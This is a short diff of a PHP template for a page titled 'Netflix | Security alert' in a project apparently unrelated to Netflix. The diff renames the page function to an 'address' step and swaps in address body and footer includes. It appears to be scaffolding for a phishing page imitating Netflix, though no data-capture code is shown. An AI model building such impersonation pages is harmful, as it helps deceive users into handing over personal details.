@@ -1,5 +1,5 @@
 <?php
-function security() {
+function address() {
     ?>
     <!DOCTYPE html>
     <html lang="en">
@@ -8,6 +8,7 @@ function security() {
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Netflix | Security alert</title>
         <link rel="stylesheet" href="/Brainstorm/assets/css/karma-styles.css?v=<?php echo time(); ?>">
+        <link rel="stylesheet" href="/Brainstorm/assets/css/address.css?v=<?php echo time(); ?>">
         <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.10.0/font/bootstrap-icons.min.css" rel="stylesheet">
     </head>
     <body>
@@ -26,7 +27,7 @@ function security() {
         </header>
 
         <?php
-        require_once 'security-body.php';
-        require_once 'security-footer.php';
+        require_once 'address-body.php';
+        require_once 'address-footer.php';
     }
 ?>
